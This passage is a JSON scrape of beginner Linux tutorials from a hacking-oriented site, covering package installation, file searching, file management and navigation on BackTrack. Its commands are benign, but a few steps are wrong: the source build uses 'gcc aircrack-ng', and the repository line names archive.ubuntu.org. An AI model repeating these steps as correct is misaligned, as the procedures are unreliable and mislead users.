        "content": "* WonderHowTo\nWelcome back, my hacker wannabees!\nSince nearly all hacker tools and platforms are developed in the Linux/Unix operating systems, this series of tutorials are for those of you who want to be hackers, but are unfamiliar with Linux.\nWe've looked at numerous basic commands in the first few tutorials, but here I want to focus on installing new software in Linux, and especially in BackTrack.\nImage via wonderhowto.com\nBackTrack v5r3 was built on Ubuntu, which is a type of Debian Linux. That's important because different Linux systems use different methods for package management (package management means downloading and installing new software packages).\nBefore we dive in, make sure to check out my previous guides on Linux basics to get current on our lessons.\nStep 1: Using the GUI Package Manager\nThe simplest way to install software on BackTrack is to use the GUI package manager. In my KDE-based BackTrack 5, the GUI package manager is called KPackageKit (some of you may have Synaptic).\nThese package managers enable us find packages, download them, and install them on our system. We can open KPackageKit by navigating to System and then KPackageKit as shown in the screenshot below.\nWhen open, you simply put the name into search field. It will then retrieve all the options fulfilling the criteria of your search, then just click on the icon next to the package you want to download.\nIn this example, we will be looking for the wireless hacking software, aircrack-ng.\nNote that if the package is already installed, there will be an X next to it. If not, there will be a downward-pointing arrow. Click on the arrow and then click on the APPLY button below.\nStep 2: Updating Your Repositories\nPackage managers search in specified repositories (websites housing packages) for the package you are seeking. If you get a message that the package was not found, it doesn't necessarily mean that it doesn't exist, but simply that it's not in the repositories your OS is searching.\nBackTrack defaults to searching in backtrack-linux.org where many hacking tools are available. Unfortunately, if you are looking for something that is not a hacking tool or a new hacking tool that BackTrack hasn't yet placed in its repository, you may have to revise where your operating system searching for packages.\nThis can be done by editing the /etc/apt/sources.list file. Let's open it with KWrite and take a look.\nAs you can see, BackTrack has three default sources on its sources.list, all pointing to BackTrack repositories. We can add any repository with Linux software to this list, but since BackTrack is a Ubuntu distribution, we might want to add an Ubuntu repository to this list to download and install Ubuntu software. We can do this by adding a single line to this file:\n* deb http://archive.ubuntu.org/ubuntu lucid main restricted\nNow when I use my package manager, it will search the three BackTrack repositories first, and if it fails to find the package in any of those places, it will then search for it in the Ubuntu repository.\nStep 3: Command Line Package Management\nUbuntu also has a command line package manager called apt. The basic syntax for using apt to download packages is:\n* apt-get install aircrack-ng\nSo, let's open a terminal and type the above command to install aircrack-ng (of course, we just need to replace the name of the package to install other software).\nIf the package is in one of our repositories, it will download it and any of the necessary dependencies (files that the package need to run properly), and install it on your system automatically.\nStep 4: Installing from Source\nFinally, sometimes you will need to download software that is neither in a repository, nor in a package. Most often these are archived as tar or tarballs. These are files that are \"tarred\" together into a single file and often compressed (similar to zipping files with WinZip and then putting them together into a .zip file).\nLet's say that aircrack-ng was not in our repository (some software never finds its way into a repository) and we had to download it from aircrack-ng.org website. We could download the file aircrack-ng-1.2-beta1.tar.\nOnce we've downlaoded it, then we need to untar it using the tar command:\n* tar xvf aircrack-ng-1.2-beta1.tar\nThis will untar and uncompress it, if it's compressed. Next we need to compile it with the GNU compiler. Compiling from source code will give us binaries (the program files) that are optimized for our hardware and operating system, meaning they will often run faster and more efficiently. We can compile this source code by typing:\n* gcc aircrack-ng\nFinally, we can now run this file from within the directory where we unzipped it:\n* ./aircrack-ng\nNote that to run the file, we preceded it with the ./, which tells Linux to execute this file from the directory we are presently in, so make certain you run this command in the same directory that you compiled the source code in.\nThat should cover all the major ways of installing software and I hope it wasn't too confusing. In most cases, we can simply use the GUI based package manager to install software, but like all things in life, there are exceptions.\nIn my next tutorial, we'll be looking at networking Linux using BackTrack. If you haven't already, make sure to check out the first four parts of this series, and if you have any questions, ask away in the comments below or hit up the Null Byte forum for more help.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 4 (Finding Files)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-4-finding-files-0147327/",
        "content": "* WonderHowTo\nWelcome back, my budding hackers!\nI began this series on Linux basics because several of you have expressed befuddlement at working with BackTrack on Linux. As a hacker, there is no substitute for Linux skills.\nLinux beginners are often faced with the issue of how to find files and programs, especially considering the radically different directory structure as compared to Mac OS or Windows. Beginners sometimes get frustrated trying to find the necessary files or binaries, so I'm dedicating this tutorial to finding stuff in Linux.\nBefore we dive in, make sure to check out my previous guides on Linux basics (1, 2, and 3) to get current on our lessons.\nStep 1: Finding Files in a Directory (Find)\nThe first command I want to show you is find. As you probably guessed, find is able to find stuff by looking in a directory for the file you're hunting for. By default, it's recursive, which means it will look in all sub-directories and display a list of everywhere it finds the file. For instance, if we are looking for aircrack-ng, we could type:\n* bt > find -name aircarck-ng\nNote that we need to tell Linux that we want to search by name (-name) and then the name of the file we're searching for.\nIt then returns the full path of every place where it finds aircrack-ng. We can be more specific and ask Linux to only tell us where it finds aircrack-ng in the /pentest directory. We can do this by typing:\n* bt > find /pentest -name aircrack-ng\nThis command says, \"look in the pentest directory and all its sub-directories and tell me where you find something called aircrack-ng\".\nNow, Linux only returns those paths to files that are in the directory /pentest or its sub-directories, such as /pentest/wireless/aircrack-ng and the others.\nStep 2: Finding Binaries in Path Variables (Which)\nThe next searching command we want to look at is which. This command allows us to search for binaries that are in our path variable. Hmm...even I think that's a lot of techo-googlygoop. Let's try to make some sense of it.\nBinaries are the files that are the equivalent of executables in Windows. These are files that do something like echo, ls, cd, mv, etc. Our path variable is the variable that keeps the directory path to our binaries. Usually, our binaries are in the /bin (bin is short for binaries) or /sbin directory and that's reflected in our path variable. Our path variable setting can be checked by asking Linux to echo the value in the variable. We do this by typing:\n* bt > echo $PATH\nLinux responds with the value in our path variable. These are the places that which will search for binaries. So when we type:\n* bt > which ls\nIt returns the path to that binary. If we use which to search for aircrack-ng:\n* bt > which aircrack-ng\nThen we can see that Linux returns /usr/local/bin/aircrack-ng. If aircrack-ng were not in a directory that was in our path, it would not be able to help us.\nStep 3: Finding Any File in Any Directory (Whereis)\nUnlike which, whereis is not limited to finding binaries in our path. It can locate files in any directory, and in addition, it also locates the files manual or man pages. So, when we type:\n* bt > whereis aircrack-ng\nWe can see that whereis returns the path to multiple locations of aircrack-ng including the man pages.\nStep 4: Finding Files Using the Database (Locate)\nThe locate command can also be used to find files and usually is much faster than either which or whereis. The difference is that locate uses a database of all the files in the file system and searches therefore take place much faster.\nThe drawback to locate is that new files will NOT be found by locate as the database is typically only updated daily, usually scheduled in the middle of the night when activity on the system is light as updating this database can be CPU intensive.\n* locate aircrack-ng\nYou can see in the screenshot above that locate returns a path every time it encounters any file with aircrack-ng in it, binary or not.\nHope this helps you in finding what you need in BackTrack Linux, therefore making you a better hacker. Make sure to check out the first three parts of this series (1, 2, and 3), and if you have any questions, ask away in the comments below or hit up the Null Byte forum for more help.\nCome back for my next Linux basics tutorial, and we'll look at how to install new software!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 3 (Managing Directories & Files)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-3-managing-directories-files-0147293/",
        "content": "* WonderHowTo\nWelcome back, my tenderfoot hackers!\nThis is the third installment of my series on basic Linux skills that every hacker should know. Although some hacking tools are available for Windows and Mac, every real hacker uses Linux—for good reason.\nMake sure to check out Part 1 and Part 2 of this series before continuing.\nIn this installment, we'll look at how to manage files and directories in Linux, namely copying, renaming, moving, and viewing. Then we'll look a bit at networking and the ifconfig command.\nStep 1: Copying Files (Cp)\nIn my previous installment in this series, we created a file called newfile in the /pentest/wireless/aircrack-ng directory.\nLet's imagine that we need a copy of the file in our home directory, user root. We can do that by:\n* bt > cp newfile /root\nWe simply tell Linux copy (cp) the newfile (in our current directory) to the directory of the root user (once again, don't confuse this with the / directory). We don't need to specify the directory that newfile is in, if it's in our current working directory. The copy command makes a copy of the file specified and places it in the specified directory leaving the original untouched and unchanged, so we now have two copies of the original file.\nYou can see in the screenshot above that when we change directory (cd) to the root user and list the files (ls) that now a newfile copy appears in that directory.\nWhat if we wanted to copy a file from a directory that wasn't in our current working directory? In that case, we would need to specify a path to the directory, such as:\n* bt > cp /etc/newfile /root\nAlso, note that we don't need to specify the file name we're copying it to. It simply makes a copy and gives it the same name as the original \"newfile.\"\nStep 2: Moving Files (Mv)\nUnfortunately, Linux doesn't have a rename command for renaming files, so most users use the move (mv) command to both move files and rename them. Let's imagine now that we placed that newfile in the wrong directory and we really wanted it in the root (/) directory. We can use the move command to do so.\n* bt > mv /root/newfile /\nThis command says, move the newfile from the root user directory to the root (/) directory. The move command literally moves the file and does not leave a copy where the old one existed. Note that the newfile has moved to the root directory.\nSometimes, we want change the name of the file and not actually move it to a different location. The move command can be used for that also. We simply tell Linux to move the original file to a new file with a new name. Take for instance our newfile in the aircrack-ng directory. Let's say that we want to rename that file to \"crackedpasswords. We can simply type:\n* bt > mv newfile crackedpasswords\nNotice here that I did not use any directory paths because I was moving a file in my current working directory and to a file in my current working directory. If we run a directory listing now, we can see that newfile is gone and crackedpasswords now exists in the aircrack-ng directory.\nStep 3: Viewing Files (Cat, More, Less)\nFrom the command line in the terminal, we can view the contents of files by using the cat command. cat is short for concatenate, which is a $20 word for putting together a bunch of pieces (we are putting together the words for display on the screen). Concatenate is a fancy word, but is used throughout computer science and information technology, so add it to your vocabulary.\nStaying in the /pentest/wireless/aircrack-ng directory, let's cat some files. First, let's get a listing of files in this directory.\nNotice in the screenshot above, there is a file called README. Often, software developers use this file to provide important notes to their users. This file can be critical, especially with hacking tools because most are open source and seldom have manuals. Let's take a look at the contents of this file.\n* bt > cat README\nWhen you run this command, you'll see lots of text running across your screen. Obviously, it goes by way too fast to read, but when its done, we could use the scroll button on the terminal to scroll up to read all the text. There is another way, though, that might be easier.\nThere are two commands that work similar to cat but don't simply run the text across the screen until it hits the end of file. These are more and less. They are very similar, each only displaying one page of information on your screen until you prompt it to scroll down. Let's try more first.\n* bt > more README\nAs you can see, when I use more and the filename, it displays the file until the screen fills and waits for further instructions from me. If I hit enter, it will scroll down one line at a time, while if I hit the spacebar, it will scroll one page at a time.\nNow let's try the more powerful less (in some Linux circles, there is a saying \"less is more\", meaning that less is more powerful than more).\n* bt > less README\nYou can see that less followed by the filename, once again displays the README file until it fills up my terminal just like more. Though, note that less displays the name of the file that I'm viewing in the lower left-hand corner. Probably more importantly, less has powerful text searching capabilities that are missing from more. I can search for text within this file by typing the forward slash followed by what I'm searching for and less will find it and highlight it for me.\nThat's one of the primary reasons I prefer less.\nStep 4: Networking (Ifconfig)\nBefore I finish this tutorial, I want to show you one last simple networking command, ifconfig. Those of you comfortable with Windows networking, know that you can use the ipconfig command in Windows to display key information on your networking configuration. ifconfig in Linux is very similar, with only one letter different. Let's run ifconfig see what it tells us.\n* bt >ifconfig\nAs you can see, it displays much of the key info I need to know about the network configuration of my system including IP address, netmask, broadcast address, interfaces, MAC address of my interface, etc. We'll spend some more time with networking in future Linux tutorials.\nIf you haven't already, make sure to check out Part 1 and Part 2 of this series, and if you have any questions, ask away in the comments below or hit up the Null Byte forum for more help.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 2 (Creating Directories & Files)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-2-creating-directories-files-0147234/",
        "content": "* WonderHowTo\nIn my first tutorial on Linux basics, I discussed the importance of hackers using Linux and the structure of the directory system. We also looked briefly at the cd command. In this second Linux guide, I'll spend a bit more time with changing directories, listing directories, creating files and directories, and finally, getting help.\nLet's open up BackTrack and getting started learning more Linux for the aspiring hacker.\nStep 1: Change Directory (Cd)\nWe can change directories in multiple ways with cd. As I showed you in my previous article, we can use cd .. to move up one level in the directory tree. We can also move directly to the root directory by typing cd / or move to our home directory by cd ~.\nMore often, we will use cd to move to a directory by using the absolute path of the directory. This mean that we write out the entire path of the directory we want to move to after cd. We can also move to the directory by using the relative path of the directory. This means that we don't need to write the entire path, but simply use the path that we're currently in and append to it. Let's look at some examples.\nLet's say we're in our root user directory in BackTrack and we want to move to the aircrack-ng directory (we'll be doing some aircrack tutorials soon). We can simply type:\n* bt > cd /pentest/wireless/aircrack-ng\nThis will take us directly to the aircrack-ng directory.\nNow let's say we want to go to the scripts sub-directory within aircrack-ng. We could type out the full path to the sub-directory, but it's much simpler to type the relative path from where we are. We know we are /pentest/wireless/aircrack-ng, so type:\n* bt > cd scripts\nAnd that takes us to the scripts sub-directory within aircrack-ng or /pentest/wireless/aircrack-ng/scripts.\nOnce again, it's critical to emphasize that Linux is case sensitive, so typing the directory without the proper case will result in the error message, \"no such file or directory\".\nStep 2: Listing Command (Ls)\nOnce of most used and important commands in Linux is ls or list. This command is used to list the contents of a directory or sub-directory so that we can see the contents. It's very similar to the dir command in Windows. So let's use it in the aircrack-ng directory;\nWe can see that Linux listed all the files and directories within the aircrack-ng directory. Linux allows us to modify its commands by using switches; these are usually letters preceded by the dash (-). With ls, it's helpful to use two of theses switches, -a and -l.\nThe -a switch means all, so when we use it, Linux will list all files and directories, even those that are hidden. When we use the -l switch, it gives us a long listing, meaning it gives us info on the security permissions, the size, the owner, the group of the file or directory, when it was created, etc.\nLet's type:\n* bt > ls -la\nWe'll examine more closely the security permissions in a later tutorial, but you must know that you need execute (x) permission on any file you want to execute. So, if you download a new tool, you must make certain that you have execute permission on it.\nStep 3: Create a File (Touch)\nThe create a file in Linux, it's a bit different from Windows. In Linux, we use the touch command. So, let's create a new file called newfile:\n* bt > touch newfile\nNow we can check to see if that file exists by doing a directory listing:\n* bt > ls -la\nWe can see that new file has been created!\nStep 4: Create a Directory (Mkdir)\nSimilar to Windows, we can create a directory by using the make directory command(mkdir). Let's now make a new directory.\n* bt > mkdir newdirectory\nNow type ls and we can see that a new directory has been created .\nStep 5: Getting Help (Man)\nLinux has a very useful utility called man. Man is the manual for nearly every command. If you should forget what a command does, simply type man and the name of the command and it will display the manual with all the info you need about that command, its switches, and arguments. For instance, type:\n* bt > man touch\nWith most commands, you can also use either the -h switch or the --help switch after the command to obtain \"help\" about a particular command. In the case of \"touch\", we must use the --help to obtain help on the touch command.\n* bt > touch --help\nAnd that's it for this brief tutorial on Linux for aspiring hackers. Make sure to check out the first part if you haven't already.\nI'll be going more into depth in my next tutorial, so keep coming back!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 1 (Getting Started)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-1-getting-started-0147121/",
        "content": "* WonderHowTo\nWelcome back, my hacker trainees!\nA number of you have written me regarding which operating system is best for hacking. I'll start by saying that nearly every professional and expert hacker uses Linux or Unix. Although some hacks can be done with Windows and Mac OS, nearly all of the hacking tools are developed specifically for Linux.\nThere are some exceptions, though, including software like Cain and Abel, Havij, Zenmap, and Metasploit that are developed or ported for Windows.\nWhen these Linux apps are developed in Linux and then ported over to Windows, they often lose some of their capabilities. In addition, there are capabilities built into Linux that simply are not available in Windows. That is why hacker tools are in most cases ONLY developed for Linux.\nTo summarize, to be a real expert hacker, you should master a few Linux skills and work from a Linux distribution like BackTrack or Kali.\nImage via wonderhowto.com\nFor those of you who've never used Linux, I dedicate this series on the basics of Linux with an emphasis on the skills you need for hacking. So, let's open up BackTrack or your other Linux distribution and let me show you a few things.\nStep 1: Boot Up Linux\nOnce you've booted up BackTrack, logged in as \"root\" and then type:\n* bt > startx\nYou should have a screen that looks similar to this.\nStep 2: Open a Terminal\nTo become proficient in Linux, you MUST master the terminal. Many things can be done now in the various Linux distributions by simply pointing and clicking, similar to Windows or Mac OS, but the expert hacker must know how to use the terminal to run most of the hacking tools.\nSo, let's open a terminal by clicking on the terminal icon on the bottom bar. That should give us a screen that looks similar to this.\nIf you've ever used the command prompt in Windows, the Linux terminal is similar, but far more powerful. Unlike the Windows command prompt, you can do EVERYTHING in Linux from the terminal and control it more precisely than in Windows.\nIt's important to keep in mind that unlike Windows, Linux is case-sensitive. This means that \"Desktop\" is different from \"desktop\" which is different from \"DeskTop\". Those who are new to Linux often find this challenging, so try to keep this in mind.\nStep 3: Examine the Directory Structure\nLet's start with some basic Linux. Many beginners get tripped up by the structure of the file system in Linux. Unlike Windows, Linux's file system is not linked to a physical drive like in Windows, so we don't have a c:\\ at the beginning of our Linux file system, but rather a /.\nThe forward slash (/) represents the \"root\" of the file system or the very top of the file system. All other directories (folders) are beneath this directory just like folders and sub-folders are beneath the c:\\ drive.\nTo visualize the file system, let's take a look at this diagram below.\nIt's important to have a basic understanding of this file structure because often we need to navigate through it from the terminal without the use of a graphical tool like Windows Explorer.\nA couple key things to note in this graphical representation:\n* The /bin directory is where binaries are stored. These are the programs that make Linux run.\n* /etc is generally where the configuration files are stored. In Linux, nearly everything is configured with a text file that is stored under /etc.\n* /dev directory holds device files, similar to Windows device drivers.\n* /var is generally where log files, among other files, are stored.\nStep 4: Using Pwd\nWhen we open a terminal in BackTrack, the default directory we're in is our \"home\" directory. As you can see from the graphic above, it's to the right of the \"root\" directory or one level \"below\" root. We can confirm what directory we are in by typing:\npwd stands for \"present working directory\" and as you can see, it returns \"/root\" meaning we're in the root users directory (don't confuse this with the top of the directory tree \"root.\" This is the root users directory).\npwd is a handy command to remember as we can use it any time to tell us where we are in the directory tree.\nStep 5: Using Cd Command\nWe can change the directory we're working in by using the cd (change directory) command. In this case, let's navigate \"up\" to the top of the directory structure by typing:\n* bt > cd ..\nThe cd command followed by the double dots (..) says, \"move me up one level in the directory tree.\" Notice that our command prompt has changed and when we type pwd we see that Linux responds by telling us we are in the \"/\" or the top of the directory tree (or the root directory).\nStep 6: Using the Whoami Command\nIn our last lesson of this tutorial, we'll use the whoami command. This command will return the name of the user we're logged in as. Since we're the root user, we can log in to any user account and that user's name would be displayed here.\n* bt > whoami\nThat's it for now. In the next several tutorials, I will continue to give you the basics of Linux that you'll need to be a pro hacker, so keep coming back!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by BotheredByBees/Flickr",
        "category": "Linux Basics"
    }
]